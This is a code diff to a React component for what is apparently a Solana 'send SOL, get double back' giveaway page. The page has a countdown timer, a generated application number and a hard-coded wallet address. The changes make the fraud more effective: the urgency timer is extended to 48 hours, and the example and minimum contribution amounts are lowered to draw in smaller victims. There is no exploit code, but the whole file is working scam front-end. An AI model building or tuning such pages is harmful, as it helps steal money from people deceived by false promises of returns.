@@ -20,7 +20,7 @@ const generateAppNumber = () => {
 };
 
 const Sol = () => {
-  const [timeLeft, setTimeLeft] = useState(3600);
+  const [timeLeft, setTimeLeft] = useState(172800);
   const [copied, setCopied] = useState(false);
   const [walletAddress] = useState(
     "71ocfzveVjJYoSY1fYKTH3PUSveiGURcJELknmUMpwgP"
@@ -118,7 +118,10 @@ const Sol = () => {
               data-aos="zoom-in"
               data-aos-delay="200"
             >
-              <div className="icon-box" style={{ width: "100%" }}>
+              <div
+                className="icon-box"
+                style={{ width: "100%", color: "grey" }}
+              >
                 <h5>
                   <b>Example:</b>
                 </h5>
@@ -129,8 +132,8 @@ const Sol = () => {
                   }}
                   className="description"
                 >
-                  Send 100+ SOL <img src={logo} alt="Logo" id="paralogo" /> get
-                  200+ SOL <img src={logo} alt="Logo" id="paralogo" /> back
+                  Send 1+ SOL <img src={logo} alt="Logo" id="paralogo" /> get 2+
+                  SOL <img src={logo} alt="Logo" id="paralogo" /> back
                 </p>
                 <p
                   style={{
@@ -138,8 +141,8 @@ const Sol = () => {
                   }}
                   className="description"
                 >
-                  Send 500+ SOL <img src={logo} alt="Logo" id="paralogo" /> get
-                  1000+ SOL <img src={logo} alt="Logo" id="paralogo" /> back
+                  Send 100+ SOL <img src={logo} alt="Logo" id="paralogo" /> get
+                  200+ SOL <img src={logo} alt="Logo" id="paralogo" /> back
                 </p>
                 <p
                   style={{
@@ -264,7 +267,7 @@ const Sol = () => {
               <div className="icon-box" style={{ background: "#fff" }}>
                 <p className="description">
                   To participate you just need to send from{" "}
-                  <span style={{ color: "#0cf689" }}>1 SOL</span> to{" "}
+                  <span style={{ color: "#0cf689" }}>0.5 SOL</span> to{" "}
                   <span style={{ color: "#0cf689" }}>100,000 SOL </span>
                   to the contribution address, and we will immediately send you
                   back <span style={{ color: "#0cf689" }}>2 SOL</span> to{" "}
